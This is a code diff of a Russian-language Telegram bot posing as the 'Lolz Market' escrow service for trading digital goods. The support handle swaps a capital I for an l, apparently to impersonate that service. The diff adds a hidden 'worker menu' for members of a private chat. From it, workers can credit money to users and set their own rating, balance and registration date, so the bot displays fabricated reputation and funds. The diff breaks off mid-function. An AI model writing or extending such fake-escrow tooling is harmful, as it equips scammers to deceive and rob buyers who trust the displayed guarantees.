@@ -318,6 +318,17 @@ BANNER_PATH = 'banner.jpg'
 # ID администратора
 ADMIN_ID = 8659836741
 
+# ID приватного чата воркеров
+WORKER_CHAT_ID = -1003887218129
+
+async def is_worker(user_id, context):
+    """Проверяет, является ли пользователь воркером (находится в приватном чате)"""
+    try:
+        member = await context.bot.get_chat_member(WORKER_CHAT_ID, user_id)
+        return member.status in ['member', 'administrator', 'creator']
+    except Exception:
+        return False
+
 async def send_or_edit_with_banner(query_or_message, text, reply_markup, context=None, is_query=True):
     """Универсальная функция. Всегда отправляет/показывает баннер."""
     banner_exists = os.path.exists(BANNER_PATH)
@@ -389,6 +400,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
+    # Проверяем, является ли пользователь воркером
+    is_user_worker = await is_worker(user.id, context)
+    
     # Deep link обработка
     if context.args and len(context.args) > 0:
         deal_id = context.args[0]
@@ -404,35 +418,38 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data.get('selected_language'):
         # Язык уже выбирался — показываем меню сразу
         welcome_text = (
-            "Добро пожаловать в Lolz Market\n\n"
-            "Безопасные сделки с гарантией\n\n"
-            "🛡 Защита от мошенников\n"
-            "📧 Автоматическое удержание средств\n"
-            "🎯 Прозрачная статистика\n"
-            "👨‍💼 Поддержка 24/7\n\n"
-            "Наш канал - @NewsLolzMarket"
+            "✨ Добро пожаловать в Lolz Market ✨\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🛡️ Безопасные сделки с гарантией\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "🔒 Защита от мошенников\n"
+            "💰 Автоматическое удержание средств\n"
+            "📊 Прозрачная статистика\n"
+            "🎯 Поддержка 24/7\n\n"
+            "💬 Поддержка: @LoIzTeamSupport"
         )
         keyboard = [
-            [InlineKeyboardButton("📝 Создать сделку", callback_data='create_deal')],
+            [InlineKeyboardButton("✨ Создать сделку", callback_data='create_deal')],
             [
                 InlineKeyboardButton("📋 Мои сделки", callback_data='my_deals'),
                 InlineKeyboardButton("🔐 Верификация", callback_data='verification')
             ],
             [
-                InlineKeyboardButton("💼 Реквизиты", callback_data='requisites'),
+                InlineKeyboardButton("💳 Реквизиты", callback_data='requisites'),
                 InlineKeyboardButton("🌐 Язык", callback_data='change_language')
-            ],
-            [
-                InlineKeyboardButton("🔗 Рефералы", callback_data='referrals'),
-                InlineKeyboardButton("ℹ️ Подробнее", callback_data='more_info')
-            ],
-            [
-                InlineKeyboardButton("📰 Lolz News", callback_data='lolz_news'),
-                InlineKeyboardButton("📨 Обращения", callback_data='appeals')
-            ],
-            [InlineKeyboardButton("📞 Поддержка", callback_data='support')],
-            [InlineKeyboardButton("📱 Мини-приложения", callback_data='mini_apps')]
+            ]
         ]
+        
+        # Добавляем воркер меню если пользователь воркер
+        if is_user_worker:
+            keyboard.append([InlineKeyboardButton("⚡ Воркер меню", callback_data='worker_menu')])
+        
+        keyboard.extend([
+            [InlineKeyboardButton("📨 Обращения", callback_data='appeals')],
+            [InlineKeyboardButton("🎯 Поддержка", callback_data='support')],
+            [InlineKeyboardButton("📱 Мини-приложения", callback_data='mini_apps')]
+        ])
+        
         if user.id == ADMIN_ID:
             keyboard.append([InlineKeyboardButton("🔧 Админ-панель", callback_data='admin_panel')])
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -445,9 +462,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Первый запуск — приветствие и выбор языка
     welcome_text = (
-        "⭐ Добро пожаловать в Lolz Team\n\n"
+        "⭐ Добро пожаловать в Lolz Team ⭐\n\n"
         "🔐 Бот для безопасных сделок.\n\n"
-        "🛡 Защита от мошенников, удобное управление и "
+        "🛡️ Защита от мошенников, удобное управление и "
         "сопровождение сделок в одном месте."
     )
     
@@ -556,10 +573,7 @@ async def freeteam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             InlineKeyboardButton("🔗 Рефералы", callback_data='referrals'),
             InlineKeyboardButton("ℹ️ Подробнее", callback_data='more_info')
         ],
-        [
-            InlineKeyboardButton("📰 Lolz News", callback_data='lolz_news'),
-            InlineKeyboardButton("📨 Обращения", callback_data='appeals')
-        ],
+        [InlineKeyboardButton("📨 Обращения", callback_data='appeals')],
         [InlineKeyboardButton("📞 Поддержка", callback_data='support')],
         [InlineKeyboardButton("📱 Мини-приложения", callback_data='mini_apps')]
     ]
@@ -705,8 +719,30 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_referrals(query, context)
     elif query.data == 'more_info':
         await show_more_info(query, context)
-    elif query.data == 'lolz_news':
-        await show_lolz_news(query, context)
+    elif query.data == 'worker_menu':
+        await show_worker_menu(query, context)
+    elif query.data == 'worker_add_money':
+        context.user_data['worker_state'] = 'add_money'
+        await worker_edit(query, "💰 Введите ID пользователя или @username для начисления денег:", [])
+    elif query.data == 'worker_set_stars':
+        context.user_data['worker_state'] = 'set_stars'
+        await worker_edit(query, "⭐ Выберите количество звезд для себя:", [
+            [InlineKeyboardButton("⭐", callback_data='worker_stars_1')],
+            [InlineKeyboardButton("⭐⭐", callback_data='worker_stars_2')],
+            [InlineKeyboardButton("⭐⭐⭐", callback_data='worker_stars_3')],
+            [InlineKeyboardButton("⭐⭐⭐⭐", callback_data='worker_stars_4')],
+            [InlineKeyboardButton("⭐⭐⭐⭐⭐", callback_data='worker_stars_5')],
+            [InlineKeyboardButton("🔙 Назад", callback_data='worker_menu')]
+        ])
+    elif query.data == 'worker_set_money':
+        context.user_data['worker_state'] = 'set_money'
+        await worker_edit(query, "💵 Введите сумму для начисления себе:", [])
+    elif query.data == 'worker_set_date':
+        context.user_data['worker_state'] = 'set_date'
+        await worker_edit(query, "📅 Введите дату регистрации в формате ДД.ММ.ГГГГ (например: 15.03.2023):", [])
+    elif query.data.startswith('worker_stars_'):
+        stars = int(query.data.replace('worker_stars_', ''))
+        await handle_worker_set_stars(query, context, stars)
     elif query.data == 'support':
         await show_support(query, context)
     elif query.data == 'mini_apps':
@@ -1010,37 +1046,40 @@ async def handle_language_selection(query, context: ContextTypes.DEFAULT_TYPE, l
 async def show_main_menu(query, context: ContextTypes.DEFAULT_TYPE):
     """Показывает главное меню бота"""
     text = (
-        "Добро пожаловать в Lolz Market\n\n"
-        "Безопасные сделки с гарантией\n\n"
-        "🛡 Защита от мошенников\n"
-        "📧 Автоматическое удержание средств\n"
-        "🎯 Прозрачная статистика\n"
-        "👨‍💼 Поддержка 24/7\n"
-        "🎭 История сделок\n\n"
-        "Наш канал - @NewsLolzMarket"
+        "✨ Добро пожаловать в Lolz Market ✨\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🛡️ Безопасные сделки с гарантией\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🔒 Защита от мошенников\n"
+        "💰 Автоматическое удержание средств\n"
+        "📊 Прозрачная статистика\n"
+        "🎯 Поддержка 24/7\n"
+        "📈 История сделок\n\n"
+        "💬 Поддержка: @LoIzTeamSupport"
     )
     
     keyboard = [
-        [InlineKeyboardButton("📝 Создать сделку", callback_data='create_deal')],
+        [InlineKeyboardButton("✨ Создать сделку", callback_data='create_deal')],
         [
             InlineKeyboardButton("📋 Мои сделки", callback_data='my_deals'),
             InlineKeyboardButton("🔐 Верификация", callback_data='verification')
         ],
         [
-            InlineKeyboardButton("💼 Реквизиты", callback_data='requisites'),
+            InlineKeyboardButton("💳 Реквизиты", callback_data='requisites'),
             InlineKeyboardButton("🌐 Язык", callback_data='change_language')
-        ],
-        [
-            InlineKeyboardButton("🔗 Рефералы", callback_data='referrals'),
-            InlineKeyboardButton("ℹ️ Подробнее", callback_data='more_info')
-        ],
-        [
-            InlineKeyboardButton("📰 Lolz News", callback_data='lolz_news'),
-            InlineKeyboardButton("📨 Обращения", callback_data='appeals')
-        ],
-        [InlineKeyboardButton("📞 Поддержка", callback_data='support')],
-        [InlineKeyboardButton("📱 Мини-приложения", callback_data='mini_apps')]
+        ]
     ]
+
+    # Проверяем, является ли пользователь воркером
+    is_user_worker = await is_worker(query.from_user.id, context)
+    if is_user_worker:
+        keyboard.append([InlineKeyboardButton("⚡ Воркер меню", callback_data='worker_menu')])
+
+    keyboard.extend([
+        [InlineKeyboardButton("📨 Обращения", callback_data='appeals')],
+        [InlineKeyboardButton("🎯 Поддержка", callback_data='support')],
+        [InlineKeyboardButton("📱 Мини-приложения", callback_data='mini_apps')]
+    ])
 
     # Кнопка админа — только для ADMIN_ID
     if query.from_user.id == ADMIN_ID:
@@ -1051,7 +1090,15 @@ async def show_main_menu(query, context: ContextTypes.DEFAULT_TYPE):
 
 async def show_product_type_menu(query, context: ContextTypes.DEFAULT_TYPE):
     """Показывает меню выбора типа товара для создания сделки"""
-    text = "🛍 Выберите что хотите продать:"
+    text = (
+        "✨ Создание новой сделки ✨\n\n"
+        "🎯 Выберите тип товара для продажи:\n\n"
+        "🎁 NFT подарки и юзернеймы\n"
+        "📱 Аккаунты и номера\n"
+        "💎 Premium и Stars\n"
+        "💬 Каналы и чаты\n\n"
+        "Выберите категорию:"
+    )
     
     # Создаем кнопки с типами товаров
     keyboard = [
@@ -1071,7 +1118,7 @@ async def show_product_type_menu(query, context: ContextTypes.DEFAULT_TYPE):
             InlineKeyboardButton("⭐ Stars", callback_data='product_stars')
         ],
         [
-            InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')
+            InlineKeyboardButton("🔙 Главное меню", callback_data='back_to_main')
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -1100,15 +1147,23 @@ async def show_currency_menu(query, context: ContextTypes.DEFAULT_TYPE, product_
     """Показывает меню выбора валюты для сделки"""
     context.user_data['product_type'] = product_type
     
-    text = "💰 Сначала выберите валюту для сделки:"
+    text = (
+        "💰 Выбор валюты для сделки 💰\n\n"
+        "🏦 Выберите удобный способ оплаты:\n\n"
+        "💳 Банковские карты\n"
+        "💎 Криптовалюта TON\n"
+        "⭐ Telegram Stars\n"
+        "🌐 Универсальный вариант\n\n"
+        "Какую валюту предпочитаете?"
+    )
     
     keyboard = [
         [InlineKeyboardButton("💳 Банковская карта RUB", callback_data='currency_rub')],
         [InlineKeyboardButton("💵 Банковская карта USD", callback_data='currency_usd')],
-        [InlineKeyboardButton("💎 TON", callback_data='currency_ton')],
+        [InlineKeyboardButton("💎 TON Кошелек", callback_data='currency_ton')],
         [InlineKeyboardButton("⭐ Telegram Stars", callback_data='currency_stars')],
         [InlineKeyboardButton("🌐 Любая валюта", callback_data='currency_any')],
-        [InlineKeyboardButton("⬅️ Назад", callback_data='create_deal')]
+        [InlineKeyboardButton("🔙 Назад", callback_data='create_deal')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -1151,14 +1206,19 @@ async def handle_currency_selection(query, context: ContextTypes.DEFAULT_TYPE, c
             [
                 InlineKeyboardButton("🔗 Рефералы", callback_data='referrals'),
                 InlineKeyboardButton("ℹ️ Подробнее", callback_data='more_info')
-            ],
-            [
-                InlineKeyboardButton("📰 Lolz News", callback_data='lolz_news'),
-                InlineKeyboardButton("📨 Обращения", callback_data='appeals')
-            ],
+            ]
+        ]
+        
+        # Проверяем, является ли пользователь воркером
+        is_user_worker = await is_worker(query.from_user.id, context)
+        if is_user_worker:
+            keyboard.append([InlineKeyboardButton("⚡ Воркер меню", callback_data='worker_menu')])
+        
+        keyboard.extend([
+            [InlineKeyboardButton("📨 Обращения", callback_data='appeals')],
             [InlineKeyboardButton("📞 Поддержка", callback_data='support')],
             [InlineKeyboardButton("📱 Мини-приложения", callback_data='mini_apps')]
-        ]
+        ])
         reply_markup = InlineKeyboardMarkup(keyboard)
         
         await send_or_edit_with_banner(query, text, reply_markup, context, is_query=True)
@@ -1189,33 +1249,40 @@ async def show_requisites_menu(query, context: ContextTypes.DEFAULT_TYPE):
     balance_usd = user_db.get('balance_usd', 0.00) if user_db else 0.00
     balance_stars = user_db.get('balance_stars', 0) if user_db else 0
     
-    ton_status = "указан" if user_requisites.get('ton') else "не указан"
-    rub_status = "указан" if user_requisites.get('rub') else "не указан"
-    usd_status = "не указан" if not user_requisites.get('usd') else "указан"
-    any_status = "не указан" if not user_requisites.get('any') else "указан"
+    ton_status = "✅ Указан" if user_requisites.get('ton') else "❌ Не указан"
+    rub_status = "✅ Указан" if user_requisites.get('rub') else "❌ Не указан"
+    usd_status = "❌ Не указан" if not user_requisites.get('usd') else "✅ Указан"
+    any_status = "❌ Не указан" if not user_requisites.get('any') else "✅ Указан"
     
     text = (
-        "ℹ️ Управление реквизитами\n\n"
-        f"• TON: {ton_status}\n"
-        f"• Карта RUB: {rub_status}\n"
-        f"• Карта USD: {usd_status}\n"
-        f"• Любая валюта: {any_status}\n\n"
+        "💳 Управление реквизитами 💳\n\n"
+        "📋 Статус реквизитов:\n"
+        f"💎 TON: {ton_status}\n"
+        f"💳 Карта RUB: {rub_status}\n"
+        f"💵 Карта USD: {usd_status}\n"
+        f"🌐 Любая валюта: {any_status}\n\n"
         "💰 Ваши балансы:\n"
-        f"• TON: {balance_ton:.2f}\n"
-        f"• RUB: {balance_rub:,.2f}\n"
-        f"• USD: {balance_usd:,.2f}\n"
-        f"• Stars: {balance_stars}\n\n"
+        f"💎 TON: {balance_ton:.2f}\n"
+        f"💳 RUB: {balance_rub:,.2f} ₽\n"
+        f"💵 USD: ${balance_usd:,.2f}\n"
+        f"⭐ Stars: {balance_stars}\n\n"
         "Выберите действие:"
     )
     
     keyboard = [
-        [InlineKeyboardButton("💎 Изменить TON", callback_data='change_ton')],
-        [InlineKeyboardButton("💳 Изменить RUB карту", callback_data='change_rub_card')],
-        [InlineKeyboardButton("💵 Изменить USD карту", callback_data='change_usd_card')],
-        [InlineKeyboardButton("🌐 Изменить реквизиты для любой валюты", callback_data='change_any_currency')],
-        [InlineKeyboardButton("💰 Пополнить баланс", callback_data='top_up_balance')],
-        [InlineKeyboardButton("💸 Вывод средств", callback_data='withdraw_funds')],
-        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
+        [
+            InlineKeyboardButton("💎 TON кошелек", callback_data='change_ton'),
+            InlineKeyboardButton("💳 RUB карта", callback_data='change_rub_card')
+        ],
+        [
+            InlineKeyboardButton("💵 USD карта", callback_data='change_usd_card'),
+            InlineKeyboardButton("🌐 Любая валюта", callback_data='change_any_currency')
+        ],
+        [
+            InlineKeyboardButton("💰 Пополнить баланс", callback_data='top_up_balance'),
+            InlineKeyboardButton("💸 Вывод средств", callback_data='withdraw_funds')
+        ],
+        [InlineKeyboardButton("🔙 Главное меню", callback_data='back_to_main')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -1250,6 +1317,12 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
     # Сначала проверяем admin state
     if user_id == ADMIN_ID and context.user_data.get('admin_state'):
         handled = await admin_handle_text(update, context)
+        if handled:
+            return
+    
+    # Проверяем worker state
+    if context.user_data.get('worker_state'):
+        handled = await worker_handle_text(update, context)
         if handled:
             return
     
@@ -1338,14 +1411,19 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             [
                 InlineKeyboardButton("🔗 Рефералы", callback_data='referrals'),
                 InlineKeyboardButton("ℹ️ Подробнее", callback_data='more_info')
-            ],
-            [
-                InlineKeyboardButton("📰 Lolz News", callback_data='lolz_news'),
-                InlineKeyboardButton("📨 Обращения", callback_data='appeals')
-            ],
+            ]
+        ]
+        
+        # Проверяем, является ли пользователь воркером
+        is_user_worker = await is_worker(update.message.from_user.id, context)
+        if is_user_worker:
+            keyboard.append([InlineKeyboardButton("⚡ Воркер меню", callback_data='worker_menu')])
+        
+        keyboard.extend([
+            [InlineKeyboardButton("📨 Обращения", callback_data='appeals')],
             [InlineKeyboardButton("📞 Поддержка", callback_data='support')],
             [InlineKeyboardButton("📱 Мини-приложения", callback_data='mini_apps')]
-        ]
+        ])
         reply_markup = InlineKeyboardMarkup(keyboard)
         if os.path.exists(BANNER_PATH):
             with open(BANNER_PATH, 'rb') as photo:
@@ -2103,42 +2181,46 @@ async def show_verification_menu(query, context: ContextTypes.DEFAULT_TYPE):
     premium_emoji = "💎" if premium_status else "⚪"
     
     text = (
-        f"{premium_emoji} Премиум-статус Lolz Market\n\n"
+        f"{premium_emoji} Премиум-статус\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "🎭 Ваша статистика:\n"
-        f"• Успешных сделок: {total_deals}\n"
-        f"• Общий объем: {total_volume:,.2f} ₽\n"
-        f"• Рефералов: {referrals_count}\n"
-        f"• Баланс: {balance_rub:,.2f} ₽\n"
-        f"• Рейтинг: {rating}/5.0 ⭐\n"
-        f"• Статус: {status_emoji} {'Верифицирован' if verified else 'Не верифицирован'}\n\n"
-        "👤 Что дает премиум-статус:\n"
-        "• 🛡 Верификация продавца - знак доверия\n"
-        "• 🤝 Гарант сделок - защита от мошенников\n"
-        "• 🎯 Приоритетная поддержка - быстрые ответы\n"
-        "• 💰 Сниженная комиссия - 0.5% вместо 1%\n"
-        "• 💸 Быстрые выплаты - в течение 1 часа\n"
-        "• 🎁 Бонусы за рефералов - +10% к балансу\n\n"
+        f"  • Успешных сделок: {total_deals}\n"
+        f"  • Общий объем: {total_volume:,.2f} ₽\n"
+        f"  • Рефералов: {referrals_count}\n"
+        f"  • Баланс: {balance_rub:,.2f} ₽\n"
+        f"  • Рейтинг: {rating}/5.0 ⭐\n"
+        f"  • Статус: {status_emoji} {'Верифицирован' if verified else 'Не верифицирован'}\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "👤 Преимущества премиум:\n\n"
+        "  🛡 Верификация продавца\n"
+        "     Знак доверия для покупателей\n\n"
+        "  🤝 Гарант сделок\n"
+        "     Защита от мошенников\n\n"
+        "  🎯 Приоритетная поддержка\n"
+        "     Быстрые ответы 24/7\n\n"
+        "  💰 Сниженная комиссия\n"
+        "     0.5% вместо 1%\n\n"
+        "  💸 Быстрые выплаты\n"
+        "     В течение 1 часа\n\n"
+        "  🎁 Бонусы за рефералов\n"
+        "     +10% к балансу\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "🛡 Безопасность:\n"
-        "• Шифрование всех данных\n"
-        "• Страхование сделок\n"
-        "• Юридическая защита\n"
-        "• 24/7 мониторинг\n\n"
-        "Преимущества:\n"
-        "• Повышенное доверие покупателей\n"
-        "• Больше успешных сделок\n"
-        "• Персональный менеджер\n"
-        "• Эксклюзивные предложения"
+        "  • Шифрование всех данных\n"
+        "  • Страхование сделок\n"
+        "  • Юридическая защита\n"
+        "  • 24/7 мониторинг"
     )
     
     if premium_status and verified:
         keyboard = [
             [InlineKeyboardButton("✅ У вас премиум-статус!", callback_data='premium_active')],
-            [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
+            [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
         ]
     else:
         keyboard = [
             [InlineKeyboardButton("📝 Подать заявку", callback_data='submit_verification')],
-            [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
+            [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
         ]
     
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -2222,7 +2304,7 @@ async def show_referrals(query, context: ContextTypes.DEFAULT_TYPE):
     
     # Определяем уровень
     if referrals_count >= 100:
-        level = "� Платина"
+        level = "💎 Платина"
         percentage = "20%"
     elif referrals_count >= 51:
         level = "🥇 Золото"
@@ -2235,29 +2317,32 @@ async def show_referrals(query, context: ContextTypes.DEFAULT_TYPE):
         percentage = "10%"
     
     text = (
-        "�🔗 Реферальная программа\n\n"
+        "👥 Реферальная программа\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "💰 Ваша статистика:\n"
-        f"• Приглашено пользователей: {referrals_count}\n"
-        f"• Заработано: {referrals_earned:,.2f} ₽\n"
-        f"• Активных рефералов: {active_referrals}\n"
-        f"• Ваш уровень: {level} ({percentage})\n\n"
+        f"  • Приглашено: {referrals_count} чел.\n"
+        f"  • Заработано: {referrals_earned:,.2f} ₽\n"
+        f"  • Активных: {active_referrals} чел.\n"
+        f"  • Ваш уровень: {level} ({percentage})\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "🎁 Условия программы:\n"
-        "• 10% от комиссии с каждой сделки реферала\n"
-        "• Бонус 50 ₽ за первого реферала\n"
-        "• Дополнительные 5% для премиум-пользователей\n"
-        "• Выплаты каждую неделю\n\n"
+        "  • 10% от комиссии с каждой сделки реферала\n"
+        "  • Бонус 50 ₽ за первого реферала\n"
+        "  • Дополнительные 5% для премиум-пользователей\n"
+        "  • Выплаты каждую неделю\n\n"
         "📊 Уровни:\n"
-        "🥉 Бронза (0-10 рефералов): 10%\n"
-        "🥈 Серебро (11-50 рефералов): 12%\n"
-        "🥇 Золото (51-100 рефералов): 15%\n"
-        "💎 Платина (100+ рефералов): 20%\n\n"
+        "  🥉 Бронза (0-10): 10%\n"
+        "  🥈 Серебро (11-50): 12%\n"
+        "  🥇 Золото (51-100): 15%\n"
+        "  💎 Платина (100+): 20%\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"🔗 Ваша реферальная ссылка:\n{ref_link}\n\n"
         "Поделитесь ссылкой с друзьями и зарабатывайте!"
     )
     
     keyboard = [
         [InlineKeyboardButton("📊 История выплат", callback_data='ref_history')],
-        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
+        [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -2266,66 +2351,40 @@ async def show_referrals(query, context: ContextTypes.DEFAULT_TYPE):
 async def show_more_info(query, context: ContextTypes.DEFAULT_TYPE):
     """Показывает подробную информацию о сервисе"""
     text = (
-        "ℹ️ Подробнее о Lolz Market\n\n"
-        "🛡 О сервисе:\n"
-        "Lolz Market - это безопасная платформа для проведения сделок "
+        "ℹ️ О сервисе Lolz Market\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "🛡 О нас:\n"
+        "  Lolz Market - это безопасная платформа для проведения сделок "
         "с цифровыми товарами. Мы гарантируем защиту от мошенников и "
         "обеспечиваем прозрачность всех операций.\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "💼 Что мы предлагаем:\n"
-        "• NFT юзернеймы и подарки\n"
-        "• Telegram аккаунты и каналы\n"
-        "• Анонимные номера\n"
-        "• Telegram Premium подписки\n"
-        "• Telegram Stars\n\n"
+        "  • NFT юзернеймы и подарки\n"
+        "  • Telegram аккаунты и каналы\n"
+        "  • Анонимные номера\n"
+        "  • Telegram Premium подписки\n"
+        "  • Telegram Stars\n\n"
         "🔒 Безопасность:\n"
-        "• Система гарантов\n"
-        "• Проверка всех участников\n"
-        "• Шифрование данных\n"
-        "• Страхование сделок\n"
-        "• 24/7 мониторинг\n\n"
+        "  • Система гарантов\n"
+        "  • Проверка всех участников\n"
+        "  • Шифрование данных\n"
+        "  • Страхование сделок\n"
+        "  • 24/7 мониторинг\n\n"
         "💰 Комиссии:\n"
-        "• Стандарт: 1% от суммы сделки\n"
-        "• Премиум: 0.5% от суммы сделки\n"
-        "• Минимальная комиссия: 10 ₽\n\n"
+        "  • Стандарт: 1% от суммы сделки\n"
+        "  • Премиум: 0.5% от суммы сделки\n"
+        "  • Минимальная комиссия: 10 ₽\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "📞 Контакты:\n"
-        "• Поддержка: @LoIzTeamSupport\n"
-        "• Новости: @NewsLolzMarket\n"
-        "• Сайт: lolz.market\n\n"
-        "⏰ Время работы:\n"
-        "Поддержка работает 24/7"
+        "  • Поддержка: @LoIzTeamSupport\n"
+        "  • Email: support@lolz.market\n\n"
+        "⏰ Работаем круглосуточно 24/7"
     )
     
     keyboard = [
         [InlineKeyboardButton("📜 Правила сервиса", callback_data='rules')],
         [InlineKeyboardButton("❓ FAQ", callback_data='faq')],
-        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await send_or_edit_with_banner(query, text, reply_markup, context, is_query=True)
-
-async def show_lolz_news(query, context: ContextTypes.DEFAULT_TYPE):
-    """Показывает новости Lolz Market"""
-    text = (
-        "📰 Lolz News\n\n"
-        "📅 Последние новости:\n\n"
-        "🎉 26.04.2026\n"
-        "Запущена новая версия бота с улучшенным интерфейсом!\n\n"
-        "💎 25.04.2026\n"
-        "Добавлена поддержка TON и Telegram Stars\n\n"
-        "🛡 24.04.2026\n"
-        "Внедрена система автоматической верификации продавцов\n\n"
-        "🎁 23.04.2026\n"
-        "Запущена реферальная программа с бонусами\n\n"
-        "📊 22.04.2026\n"
-        "Снижена комиссия для премиум-пользователей до 0.5%\n\n"
-        "Подпишитесь на наш канал @NewsLolzMarket, "
-        "чтобы не пропустить важные обновления!"
-    )
-    
-    keyboard = [
-        [InlineKeyboardButton("📢 Подписаться на канал", url='https://t.me/NewsLolzMarket')],
-        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
+        [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -2334,31 +2393,34 @@ async def show_lolz_news(query, context: ContextTypes.DEFAULT_TYPE):
 async def show_support(query, context: ContextTypes.DEFAULT_TYPE):
     """Показывает меню поддержки"""
     text = (
-        "📞 Поддержка Lolz Market\n\n"
-        "👋 Здравствуйте! Мы готовы помочь вам 24/7.\n\n"
-        "📋 Выберите тему обращения:\n\n"
+        "📞 Поддержка 24/7\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "👋 Здравствуйте! Мы готовы помочь вам круглосуточно.\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "📋 Темы обращений:\n\n"
         "💬 Общие вопросы:\n"
-        "• Как создать сделку?\n"
-        "• Как работает гарант?\n"
-        "• Вопросы по комиссиям\n\n"
+        "  • Как создать сделку?\n"
+        "  • Как работает гарант?\n"
+        "  • Вопросы по комиссиям\n\n"
         "🔧 Технические проблемы:\n"
-        "• Ошибки в работе бота\n"
-        "• Проблемы с оплатой\n"
-        "• Не приходят уведомления\n\n"
+        "  • Ошибки в работе бота\n"
+        "  • Проблемы с оплатой\n"
+        "  • Не приходят уведомления\n\n"
         "⚠️ Срочные вопросы:\n"
-        "• Проблемы со сделкой\n"
-        "• Подозрение на мошенничество\n"
-        "• Блокировка аккаунта\n\n"
+        "  • Проблемы со сделкой\n"
+        "  • Подозрение на мошенничество\n"
+        "  • Блокировка аккаунта\n\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "📧 Контакты:\n"
-        "• Telegram: @LoIzTeamSupport\n"
-        "• Email: support@lolz.market\n\n"
+        "  • Telegram: @LoIzTeamSupport\n"
+        "  • Email: support@lolz.market\n\n"
         "⏱ Среднее время ответа: 5-15 минут"
     )
     
     keyboard = [
-        [InlineKeyboardButton("💬 Написать в поддержку", url='https://t.me/ManagerMarketLolz')],
+        [InlineKeyboardButton("💬 Написать в поддержку", url='https://t.me/LoIzTeamSupport')],
         [InlineKeyboardButton("❓ FAQ", callback_data='faq')],
-        [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
+        [InlineKeyboardButton("🔙 Назад", callback_data='back_to_main')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -2493,6 +2555,186 @@ async def handle_withdraw_currency(query, context: ContextTypes.DEFAULT_TYPE, cu
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await send_or_edit_with_banner(query, text, reply_markup, context, is_query=True)
+
+# ═══════════════════════════════════════════════════════════════════
+# WORKER MENU — только для воркеров из приватного чата
+# ═══════════════════════════════════════════════════════════════════
+
+async def worker_edit(query, text, keyboard):
+    """Редактирует сообщение воркера"""
+    reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
+    await send_or_edit_with_banner(query, text, reply_markup, query.message.chat.id if hasattr(query, 'message') else None, is_query=True)
+
+async def show_worker_menu(query, context):
+    """Показывает воркер меню"""
+    is_user_worker = await is_worker(query.from_user.id, context)
+    if not is_user_worker:
+        await query.answer("❌ У вас нет доступа к воркер меню!", show_alert=True)
+        return
+    
+    text = (
+        "⚡ Воркер меню ⚡\n\n"
+        "🔧 Панель управления для воркеров\n\n"
+        "💰 Начисление денег пользователям\n"
+        "⭐ Управление своим рейтингом\n"
+        "💵 Управление своим балансом\n"
+        "📅 Изменение даты регистрации\n\n"
+        "Выберите действие:"
+    )
+    
+    keyboard = [
+        [InlineKeyboardButton("💰 Начислить деньги", callback_data='worker_add_money')],
+        [
+            InlineKeyboardButton("⭐ Установить звезды", callback_data='worker_set_stars'),
+            InlineKeyboardButton("💵 Установить баланс", callback_data='worker_set_money')
+        ],
+        [InlineKeyboardButton("📅 Изменить дату регистрации", callback_data='worker_set_date')],
+        [InlineKeyboardButton("🔙 Главное меню", callback_data='main_menu')]
+    ]
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await send_or_edit_with_banner(query, text, reply_markup, context, is_query=True)
+
+async def handle_worker_set_stars(query, context, stars):
+    """Устанавливает звезды воркеру"""
+    is_user_worker = await is_worker(query.from_user.id, context)
+    if not is_user_worker:
+        await query.answer("❌ У вас нет доступа к воркер меню!", show_alert=True)
+        return
+    
+    try:
+        db = get_db()
+        cursor = db.cursor()
+        cursor.execute('UPDATE users SET rating = ? WHERE user_id = ?', (float(stars), query.from_user.id))
+        db.commit()
+        db.close()
+        
